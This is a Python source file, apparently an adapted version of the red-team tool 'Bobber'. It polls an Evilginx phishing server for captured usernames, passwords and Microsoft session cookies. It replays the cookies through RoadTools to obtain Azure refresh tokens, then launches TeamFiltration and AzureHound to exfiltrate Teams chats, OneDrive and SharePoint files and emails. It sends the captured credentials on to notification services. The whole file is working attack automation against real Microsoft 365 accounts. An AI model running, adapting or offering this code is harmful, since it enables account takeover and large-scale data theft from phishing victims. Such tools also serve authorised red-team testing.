#!/usr/bin/python3
import shlex
import subprocess
import os
import argparse
import paramiko
import threading
import time
import json
import codecs
import platform
import sys
import requests
from colorama import init, Fore
from concurrent.futures import ThreadPoolExecutor
import logging
import requests

#Comments, error handling and readability curtsey of everyone's favorite LLM model!

from selenium import webdriver
from seleniumwire import webdriver as webdriver_wire

# Import only necessary modules from roadtools.roadlib
from roadtools.roadlib.auth import Authentication
from roadtools.roadlib.deviceauth import DeviceAuthentication
from roadtools.roadtx.selenium import SeleniumAuthentication

# Initialize colorama for colored output
init(autoreset=True)

# Define log icons
INFO_ICON = Fore.CYAN + "[INFO]"
SUCCESS_ICON = Fore.GREEN + "[SUCCESS]"
ERROR_ICON = Fore.RED + "[ERROR]"
WARNING_ICON = Fore.YELLOW + "[WARNING]"

# Initialize the Pushover client to send notifications
opsgenie_client=None
pushClient = None
tfArguments = []

class PushoverClient:
    def __init__(self, user_key, api_token):
        self.user_key = user_key
        self.api_token = api_token

    def send_message(self, message, title=None):
        try:
            data = {
                "token": self.api_token,
                "user": self.user_key,
                "message": message
            }
            if title:
                data["title"] = title
            response = requests.post("https://api.pushover.net/1/messages.json", data=data)
            if response.status_code == 200:
                print("{SUCCESS_ICON} Pushover notification sent successfully!")
            else:
                print(f"{ERROR_ICON} Failed to send notification, Status Code: {response.status_code} , Response: {response.text}")
        except Exception as e:
             print(f"{ERROR_ICON} Failed to send notification {e}")


class OpsgenieClient:
    def __init__(self, api_key):
        self.api_token = api_key

    def create_opsgenie_alert(self, message, description):
        url = "https://api.opsgenie.com/v2/alerts"
        headers = {
            "Content-Type": "application/json",
            "Authorization": f"GenieKey {self.api_token}"
        }
        
        payload = {
            "message": message,
            "priority": "P2",
            "source": "Python API"
        }
        
        payload["description"] = description
        payload["tags"] = ["3DP_Bobber"]
        
        response = requests.post(url, json=payload, headers=headers)
        
        if response.status_code == 202:
            print("Alert created successfully!")
        else:
            print(f"Failed to create alert: {response.status_code} - {response.text}")


class LazySeleniumAuthentication(SeleniumAuthentication):

    def get_webdriver(self, service, intercept=False):
        '''
        Overides the original get_webdriver in order to make sure we ignore any TLS errors/ trustissues
        Load webdriver based on service, which is either
        from selenium or selenium-wire if interception is requested
        '''

        options = {'request_storage': 'memory'}
        if intercept and self.headless:
            firefox_options=self.FirefoxOptions()
            firefox_options.add_argument("-headless")
            driver = webdriver_wire.Firefox(service=service,  options=firefox_options, seleniumwire_options=options)
        elif intercept:
            seleniumwireOptions = {}
            seleniumwireOptions['desired_capabilities'] = {
                'acceptInsecureCerts': True
            }
            driver = webdriver_wire.Firefox(service=service, seleniumwire_options=seleniumwireOptions)
        else:
            driver = webdriver.Firefox(service=service)
        return driver


def json_to_string(data):
    # Check for empty strings or None values
    for key, value in data.items():
        if value == "" or value is None:
            logging.warning(f"Warning: Value for '{key}' is empty or None.")
    
    # Convert JSON object to a formatted string
    json_str = json.dumps(data, separators=(', ', ': '))
    return json_str

# def config_extract():
#     with open('./config.json', 'r') as file:
#         data = json.load(file)
#     Opsgenie_API_Key=["Opsgenie_API_Key"]
#     Bobber_config=json_to_string(data["Bobber"])
#     Bobber_config["Opsgenie_API_Key"] = Opsgenie_API_Key
#     return Bobber_config

def default_teamfiltration_filename():
    if platform.system() == 'Windows':
        return 'TeamFiltration.exe'
    else:
        return 'TeamFiltration'
    
def default_geckodriver_filename():
    if platform.system() == 'Windows':
        return 'geckodriver.exe'
    else:
        return 'geckodriver'

def is_dependency_present(binary_name):
    """
    Checks if a given binary is present in the system PATH or current directory.

    Returns:
        bool: True if binary is found and executable, False otherwise.
    """
    # Check if the binary is in the current directory and executable
    if os.path.isfile(binary_name) and os.access(binary_name, os.X_OK):
        return True
    
    # Check system PATH for the binary
    system_path = os.environ.get("PATH", "")
    for directory in system_path.split(os.pathsep):
        binary_path = os.path.join(directory, binary_name)
        if os.path.isfile(binary_path) and os.access(binary_path, os.X_OK):
            return True
    
    # Binary not found in PATH or current directory
    return False

def extract_valid_jsons(filename):
    #No longer line by line but by an array
    valid_jsons = []
    try:
        # Open the file and parse its content
        with open(filename, 'r') as file:
            data = json.load(file)  # Load the entire JSON content
            
            if isinstance(data, list):  # Check if the root element is a list
                for item in data:
                    if isinstance(item, dict):  # Ensure each item is a valid JSON object
                        valid_jsons.append(item)
                    else:
                        print(f"Ignored an item that is not a JSON object: {item}")
            else:
                print("The JSON file does not contain a root array.")
    
    except FileNotFoundError:
        print(f"The file '{filename}' was not found.")
    except json.JSONDecodeError as e:
        print(f"Error decoding JSON in the file: {e}")
    except IOError as e:
        print(f"An I/O error occurred while reading '{filename}': {e}")
    
    return valid_jsons
 

def download_remote_file(ssh, remote_file, local_file):
    try:
        sftp = ssh.open_sftp()
        sftp.get(remote_file, local_file)
        sftp.close()
        print(f"{INFO_ICON} File '{remote_file}' successfully downloaded as '{local_file}'.")        
    except Exception as e:
        print(f"{ERROR_ICON} Failed to download file: {e}")

def execute_authentication(estscookie, username, resourceUri, clientId, redirectUrl, geckoDriverPath, teamFiltrationPath, keepOpen, azhd=False, azhd_path=None):
    # Attempt to execute the authentication process
    try:
        # Informing the user about the start of the process
        print(f"{INFO_ICON} Using RoadTools to retrieve JWT tokens for {username}")
        
        # Initialize authentication objects
        deviceAuthObject = DeviceAuthentication()
        authObject = Authentication()

        # Set parameters for the authentication object
        authObject.set_client_id(clientId)
        authObject.set_resource_uri(resourceUri)
        authObject.verify = False
        authObject.tenant = None

        # Disable SSL verification for device authentication
        deviceAuthObject.verify = False
        
        # Initialize lazy selenium authentication object
        selAuthObject = LazySeleniumAuthentication(authObject, deviceAuthObject, redirectUrl, None)
       
        # Build the authentication URL
        authUrl = authObject.build_auth_url(redirectUrl, 'code', None)

        # Get the selenium service based on the gecko driver path
        selAuthService = selAuthObject.get_service(geckoDriverPath)
        if not selAuthService:
            print(f"{ERROR_ICON} Selenium service could not be started.")
            return None

        # Get the selenium webdriver
        selAuthObject.driver = selAuthObject.get_webdriver(selAuthService, intercept=True)
        
        # Perform login using selenium with the provided ESTSCookie
        jsonTokenObject = selAuthObject.selenium_login_with_estscookie(authUrl, None, None, None, keepOpen, False, estscookie=estscookie)
  
        # Extract the refresh token from the response
        refreshToken = jsonTokenObject.get("refreshToken")
        TenantID = jsonTokenObject.get("tenantId")
        if refreshToken:
            print(f"{SUCCESS_ICON} Got Refresh token: {refreshToken[:30]}....")
        else:
            print(f"{ERROR_ICON} No refresh token found in the response from RoadTools")
            return None
        
        # Save the token to a file after sanitizing the username for safe file naming
        safeUserName = username.replace('@','_').replace('.','_')
        #changed to Shared Volume
        outfilePath = f"/shared-data/fresh-data/{safeUserName}_roadtools_auth"
        with codecs.open(outfilePath, 'w', 'utf-8') as outfile:
            json.dump(jsonTokenObject, outfile)

        print(f'{INFO_ICON} Tokens were written to {outfilePath}')
    
        # Additional functionality to use TeamFiltration if present
        # Build the command line for TeamFiltration if arguments are provided
        if tfArguments:
            #Get the full path to the binary, needed for linux(?)
            teamFiltrationPath = os.path.join(os.getcwd(), teamFiltrationPath)
            
            #Build the command line
            TFoutpath = f"/shared-data/used-data/TF_{safeUserName}"
            #OutPath is a directory/path and outfilePath is the refresh token source
            commandLine = f"{teamFiltrationPath} --outpath {TFoutpath} --roadtools {outfilePath} --exfil "
            commandLine += " ".join(tfArguments)

            print(f"{INFO_ICON} Executing: {commandLine}")

            #split the command line into a list, not needed for Windows, but needed for linux (?) ¯\_(ツ)_/¯ 
            if not platform.system() == 'Windows':
                commandLine = shlex.split(commandLine)

            # Execute the TeamFiltration command
            process = subprocess.Popen(commandLine,  stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # Read and display the output line by line
            for line in iter(process.stdout.readline, ''):
                print(line.strip())
            # Wait for the process to finish and get the output
            stdout, stderr = process.communicate()
            if stdout:
                print(stdout.strip())
            if stderr:
                print(stderr.strip(), file=sys.stderr)

            if opsgenie_client is not None:    
                opsgenie_client.create_opsgenie_alert(f"Bobber: TeamFiltration exploited, directory {safeUserName} created: {TFoutpath}")

        
        if azhd and azhd_path is not None:
            #Get the full path to the binary, needed for linux(?)
            bin_azhd_path = os.path.join(os.getcwd(), azhd_path)
            
            #Build the command line
            AZoutpath= f"/shared-data/used-data/AZHD_{safeUserName}.json"
            univerSal_outpath= f"/shared-data/used-data/"
            commandLine = f"{bin_azhd_path} -r {refreshToken} -t {TenantID} list -o {AZoutpath}"

            print(f"{INFO_ICON} Executing: {commandLine}")

            #split the command line into a list, not needed for Windows, but needed for linux (?) ¯\_(ツ)_/¯ 
            if not platform.system() == 'Windows':
                commandLine = shlex.split(commandLine)

            # Execute the TeamFiltration command
            process = subprocess.Popen(commandLine,  stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # Read and display the output line by line
            for line in iter(process.stdout.readline, ''):
                print(line.strip())
            # Wait for the process to finish and get the output
            stdout, stderr = process.communicate()
            if stdout:
                print(stdout.strip())
            if stderr:
                print(stderr.strip(), file=sys.stderr)
            
            if opsgenie_client is not None:    
                opsgenie_client.create_opsgenie_alert(f"Bobber: Azurehound exploited, JSON file created: AZHD_{safeUserName}.json")


    # Catch any exception that was not explicitly handled above
    except Exception as e:
        print(ERROR_ICON + f"Error: {e}")
        return

def process_combinations(valid_json_objects, processed_combinations):
    unique_combinations = {}

    for obj in reversed(valid_json_objects):
        try:
            username = obj.get("username", "")
            password = obj.get("password", "")
            if username and password:
                tokens = obj.get("tokens", {})
                for token in tokens.values():
                    #This can be updated and/changed to hit another or multiple cookies
                    tokenData = token.get("ESTSAUTHPERSISTENT", {}).get("Value", "")
                    if tokenData:
                        key = f"{username}:{password}"
                        if key not in processed_combinations:
                            unique_combinations[key] = tokenData
                            print(f"{SUCCESS_ICON} Found session with captured cookie for : {username}")
                            processed_combinations.add(key)
                            
                            if pushClient is not None:
                                pushClient.send_message(
                                    f"A set of credentials and session cookies have been captured for the user {username}"
                                    , title="Bobber alert, new session!")

                            if opsgenie_client is not None:    
                                opsgenie_client.create_opsgenie_alert(f"A set of credentials and session cookies have been captured for the user {username}\n{key}",
                                 "Bobber alert, new session caught!")
        except Exception as e:
            pass

    return unique_combinations

def monitor_remote_database(remote_info, processed_combinations, args, azhd=False, azhd_path=None):
    with paramiko.SSHClient() as ssh:
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            if remote_info.get('password'):
                ssh.connect(remote_info['host'], 
                            port=remote_info['port'], 
                            username=remote_info['username'], 
                            password=remote_info['password'])
            else:
                # Use the key for authentication
                ssh.connect(remote_info['host'], 
                            port=remote_info['port'], 
                            username=remote_info['username'], 
                            key_filename=remote_info.get('key', None))
            # ssh.connect(remote_info['host'], port=remote_info['port'], username=remote_info['username'], password=remote_info['password'], key_filename=remote_info['key'])
        except paramiko.AuthenticationException:
            print(f"{ERROR_ICON} SSH authentication failed. Please check your credentials.")
            return
        except paramiko.SSHException as e:
            print(f"{ERROR_ICON} SSH error: {e}")
            return

        # Paths for the two files to monitor
        container_path_db = remote_info['container_path']  # e.g., "root/.evilginx/data.db"
        container_path_json = os.path.join(os.path.dirname(container_path_db), "sessions.json")

        # Local filename for the JSON file
        local_file_json = f"{remote_info['host'].replace('.', '_')}_{os.path.basename(container_path_json)}"
        
        # Temporary paths on the remote host
        temp_remote_path_json = f"/shared-data/used-data/{os.path.basename(container_path_json)}"
        
        container_name = "3DP_Evilginx2"
        previous_mtime_db = None
        previous_mtime_json = None

        while True:
            try:
                # Check modification time for data.db
                stdin_db, stdout_db, stderr_db = ssh.exec_command(
                    f"docker exec {container_name} stat -c %Y {container_path_db}"
                )
                container_mtime_db = int(stdout_db.read().strip())

                # Check modification time for sessions.json
                stdin_json, stdout_json, stderr_json = ssh.exec_command(
                    f"docker exec {container_name} stat -c %Y {container_path_json}"
                )
                container_mtime_json = int(stdout_json.read().strip())

                # If both files have been modified, update and download only sessions.json
                if (previous_mtime_db is None or container_mtime_db > previous_mtime_db) and \
                   (previous_mtime_json is None or container_mtime_json > previous_mtime_json):
                    
                    previous_mtime_db = container_mtime_db
                    previous_mtime_json = container_mtime_json
                    
                    # Copy sessions.json from container to remote host's /tmp directory
                    ssh.exec_command(f"docker cp {container_name}:{container_path_json} {temp_remote_path_json}")

                    # Download sessions.json from the remote host to the local machine (this docker container)
                    download_remote_file(ssh, temp_remote_path_json, local_file_json)

                    # Process the downloaded JSON file
                    valid_json_objects = extract_valid_jsons(local_file_json)
                    new_combinations = process_combinations(valid_json_objects, processed_combinations)
                    for key, tokenData in new_combinations.items():
                        with ThreadPoolExecutor() as executor:
                            executor.submit(
                                execute_authentication, tokenData, key.split(':')[0],
                                args.resource, args.client, args.redirect_url,
                                args.driver_path, args.tf_path, args.keep_open, 
                                azhd, azhd_path
                            )
                    
                    # Clean up the temporary JSON file on the remote host
                    ssh.exec_command(f"rm -f {temp_remote_path_json}")

            except Exception as e:
                print(f"{ERROR_ICON} Error monitoring remote files: {e}")

            time.sleep(5)

if __name__ == "__main__":
    # ASCII Banner
    banner = """                                        
                                         ▓▓                                                         
                                         ▓▓▓                                                        
                                          ▓▓                                                        
                                          ▓▓▓                                                       
                                           ▓▓                                                       
                                           ▓▓▓                                                      
                                            ▓▓                                                      
                                            ▓▓▓                                                     
                                             ▓▓                                                     
                                             ▓▓▓                                                    
                           ░░░░░░░░░░░░░░░░░░█▓▓▓▓▓░░░░░░░░░░░░░                                    
                 ░░░░░░░░                   ▓▓▓█▓▓▓▓▓             ░░░░░░░░                          
           ░░░░░░             ░░░░░░░░░░░░░▓▓▓▓▓▓█▓█▓▓▓░░░░░░             ░░░░░░                    
      ░░░░░░          ░░░░░░               ▓▓█▓▓▓▓▓▓▓▓▓▓       ░░░░░░           ░░░░░               
   ░░░░░         ░░░░░           ░░░░░░░░░░▓▓▓▓█▓▓▓▓█▓▓▓░░           ░░░░░         ░░░░░            
 ░░░░░        ░░░░░         ░░░░░          ▓█▓▓▓▓█▓▓▓▓█▓▓ ░░░░░         ░░░░░        ░░░░░          
░░░░░        ░░░░        ░░░░░          ░░░▒▓▓▓▓▓▓▓▓█▓▓▓▓    ░░░░░        ░░░░        ░░░░░         
░░░░        ░░░░░        ░░░░          ░░░ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒     ░░░░        ░░░░░        ░░░░       
 ░░░░        ░░░░░        ░░░░░         ░░░░░▒▒▒▒▒▒▒▒▒▒▒  ░░░░░░         ░░░░░        ░░░░      
  ░░░░░        ░░░░░         ░░░░            ░░░░░░         ░░░░░        ░░ 
    ░░░░░         ░░░░░           ░░░░░░░░        ░░░░░░░░           ░░░░░         ░░░   
                                                                        
                                Bobber - Bounces when a fish bites!
                                v0.1 - @flangvik @TrustedSec
                                Uses RoadTools by @_dirkjan
    """
    # print(Fore.CYAN + banner)

    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument("database_path", help="Path to the local OR remote Evilginx database file.")

    ssh_group = arg_parser.add_argument_group('SSH Options', 'Evilginx database monitoring SSH options')
    ssh_group.add_argument("--host", help="SSH hostname/IP when fetching from a remote host.")
    ssh_group.add_argument("--port", type=int, default=22, help="SSH port when fetching from a remote host.")
    ssh_group.add_argument("--username", help="SSH username when fetching from a remote host.", default="root")
    ssh_group.add_argument("--password", help="SSH password when fetching from a remote host.", required=False)
    ssh_group.add_argument("--key", default=os.path.expanduser("~/.ssh/id_rsa"), help="Path to the SSH private key file for authentication.")

    pushover_group = arg_parser.add_argument_group('Pushover Options', 'Pushover notifications options')
    pushover_group.add_argument('--user-key', type=str, required=False, help='Pushover User Key')
    pushover_group.add_argument('--api-token', type=str, required=False, help='Pushover API Token')

    opsgenie_group = arg_parser.add_argument_group('Opsgenie Options', 'Opsgenie notifications options')
    opsgenie_group.add_argument('--ops_api', type=str, required=False, help='Opsgenie API Token')

    teamfiltration_group = arg_parser.add_argument_group('TeamFiltration Options', 'Exfiltration options for TeamFiltration')
    teamfiltration_group.add_argument('--all', action='store_true', help='Exfiltrate information from ALL SSO resources (Graph, OWA, SharePoint, OneDrive, Teams)')
    teamfiltration_group.add_argument('--aad', action='store_true', help='Exfiltrate information from Graph API (domain users and groups)')
    teamfiltration_group.add_argument('--teams', action='store_true', help='Exfiltrate information from Teams API (files, chatlogs, attachments, contactlist)')
    teamfiltration_group.add_argument('--onedrive', action='store_true', help='Exfiltrate information from OneDrive/SharePoint API (accessible SharePoint files and the user\'s entire OneDrive directory)')
    teamfiltration_group.add_argument('--owa', action='store_true', help='Exfiltrate information from the Outlook REST API (The last 2k emails, both sent and received)')
    teamfiltration_group.add_argument('--owa-limit', type=int, help='Set the max amount of emails to exfiltrate, default is 2k.')
    teamfiltration_group.add_argument('--tf-path', action='store', help='Path to your TeamFiltration file on disk (download from https://github.com/Flangvik/TeamFiltration/releases/latest)',default=default_teamfiltration_filename())

    #No arguments added
    azurehound_group = arg_parser.add_argument_group('TeamFiltration Options', 'Exfiltration options for TeamFiltration')
    azurehound_group.add_argument('--azhd_path', action='store_true', help='Azurehound binary path')
    azurehound_group.add_argument('--azhd', action='store_true', help='Collector for Azure data for BloodHound and BloodHound Enterprise')
    # azurehound_group.add_argument('--verb', type=int, help='AzureHound verbosity level (defaults to 0) [Min: -1, Max: 2]')

    #Teams for mobile and desktop app: 1fec8e78-bce4-4aaf-ab1b-5451cc387264
    #Teams web app: 5e3ce6c0-2b1f-4285-8d4b-75ee78787346
    roadtools_group = arg_parser.add_argument_group('RoadTools Options', description='RoadTools RoadTX interactive authentication options')
    roadtools_group.add_argument('-c','--client',action='store',help="!Needed! Client ID (application ID / GUID ) to use when authenticating (Teams Client by default)",default='1fec8e78-bce4-4aaf-ab1b-5451cc387264')
    roadtools_group.add_argument('-r','--resource',action='store',help='!Needed! Resource to authenticate to. Either a full URL or alias (list with roadtx listaliases)',default='https://graph.windows.net')
    roadtools_group.add_argument('-s','--scope',action='store',help='Scope to use. Will automatically switch to v2.0 auth endpoint if specified. If unsure use -r instead.')
    roadtools_group.add_argument('-ru', '--redirect-url', action='store', metavar='URL',help='!Needed! Redirect URL used when authenticating (default: https://login.microsoftonline.com/common/oauth2/nativeclient)',default="https://login.microsoftonline.com/common/oauth2/nativeclient")
    roadtools_group.add_argument('-t','--tenant',action='store',help='Tenant ID or domain to auth to',required=False)
    roadtools_group.add_argument('-d', '--driver-path',action='store',help='!Needed! Path to geckodriver file on disk (download from: https://github.com/mozilla/geckodriver/releases/latest)',default=default_geckodriver_filename())
    roadtools_group.add_argument('-k', '--keep-open', action='store_true', help='!Needed! Do not close the browser window after timeout. Useful if you want to browse online apps with the obtained credentials')
    
    args = arg_parser.parse_args()
    processed_combinations = set()
    
    logging.basicConfig(level=logging.INFO)

    # The double dash is what sets it. e.g. --driver-path, --host and --onedrive

    if not is_dependency_present(args.driver_path):
        print(f'{ERROR_ICON} Geckdriver not found! Required for RoadTools RoadTX, download from https://github.com/mozilla/geckodriver/releases/latest')
        exit(0)

    if args.user_key and args.api_token:
        pushover_configured=True
        pushClient = PushoverClient(args.user_key, api_token=args.api_token)
        print(f"{INFO_ICON} Pushover notifications activated!")

    if args.ops_api:
        opsgenie_config=True
        opsgenie_client = OpsgenieClient(args.ops_api)
        print(f"{INFO_ICON} Opsgenie notifications activated!")


    if args.all:
        tfArguments.append('--all')
    else:
        if args.aad:
            tfArguments.append('--aad')
        if args.teams:
            tfArguments.append('--teams')
        if args.onedrive:
            tfArguments.append('--onedrive')
        if args.owa:
            tfArguments.append('--owa')
    
    if args.owa_limit:
        tfArguments.append(f'--owa-limit {args.owa_limit}')

    if not is_dependency_present(args.tf_path) and tfArguments:
        print(f'{ERROR_ICON} TeamFiltration not found! Required for exfiltration, download from https://github.com/Flangvik/TeamFiltration/releases/latest')
        exit(0)

    if not is_dependency_present(args.azhd_path):
        print(f'{ERROR_ICON} Azurehound not found! Optional but useful, download from https://github.com/BloodHoundAD/AzureHound')

    if args.azhd and args.azhd_path:
        azhdArguments=True
    else:
        print("For Azurehound both --azhd and --azhd_path must be used with appropiate data.")

    if args.host:
        remote_info = {
            'host': args.host,
            'port': args.port,
            'username': args.username,
            'password': args.password,
            'key': args.key,
            'remote_path': args.database_path
        }
        print(f"{INFO_ICON} SSH is enabled for remote database access. Starting to monitor the remote database file...")
        monitor_remote_database(remote_info, processed_combinations, args, azhdArguments, args.azhd_path)
    else:
        print(f"{INFO_ICON} SSH is not enabled. Monitoring local database file {args.database_path}")
        previous_mtime_db = None
        previous_mtime_json = None
        while True:
            try:
                # Get modification time for data.db
                container_mtime_db = os.path.getmtime(args.database_path)

                # Get modification time for sessions.json
                container_path_json = os.path.join(os.path.dirname(args.database_path), "sessions.json")
                container_mtime_json = os.path.getmtime(container_path_json)

                # Check if both files have been modified
                if (previous_mtime_db is None or container_mtime_db > previous_mtime_db) and \
                (previous_mtime_json is None or container_mtime_json > previous_mtime_json):
                    
                    previous_mtime_db = container_mtime_db
                    previous_mtime_json = container_mtime_json
                valid_json_objects = extract_valid_jsons(container_path_json)
                initial_combinations = process_combinations(valid_json_objects, processed_combinations)
                for key, tokenData in initial_combinations.items():
                    with ThreadPoolExecutor() as executor:
                        executor.submit(execute_authentication, tokenData, key.split(':')[0], args.resource, args.client, args.redirect_url, args.driver_path, args.tf_path, args.keep_open, azhdArguments, args.azhd_path)
                time.sleep(5000)     
            except FileNotFoundError:
                print(f"{ERROR_ICON} One of the files was not found. Make Sure Evilginx is setup correctly")
            except Exception as e:
                print(f"{ERROR_ICON} Error monitoring local files: {e}")
